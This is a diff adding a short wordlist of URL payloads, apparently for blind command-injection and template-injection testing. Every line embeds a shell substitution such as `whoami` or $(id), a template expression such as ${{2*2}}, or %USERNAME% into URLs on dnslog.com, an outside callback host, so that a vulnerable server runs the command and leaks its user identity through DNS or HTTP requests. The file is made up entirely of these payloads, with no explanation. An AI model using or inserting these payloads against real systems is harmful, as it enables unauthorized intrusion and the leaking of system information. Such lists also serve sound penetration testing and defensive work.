@@ -1,0 +1,17 @@
+http://`whoami`.dnslog.com
+http://`id`.dnslog.com
+http://$(id).dnslog.com
+http://$(whoami).dnslog.com
+http://dnslog.com/test.png?aaa=`whoami`
+http://dnslog.com/test.png?aaa=`id`
+http://dnslog.com/test.png?aaa=$(id)
+http://dnslog.com/test.png?aaa=$(whoami)
+http://dnslog.com/test.png?aaa=$(\w\h\o\a\m\i)
+http://dnslog.com/$(id).png
+http://dnslog.com/$(whoami).png
+http://dnslog.com/test.png?aaa=${2*2}
+http://dnslog.com/?test.png?aaa=${{2*2}}
+http://dnslog.com/?${2*2}.png
+http://dnslog.com/?${{2*2}}.png
+http://dnslog.com/%USERNAME%.png
+http://%USERNAME%.dnslog.com/test.png
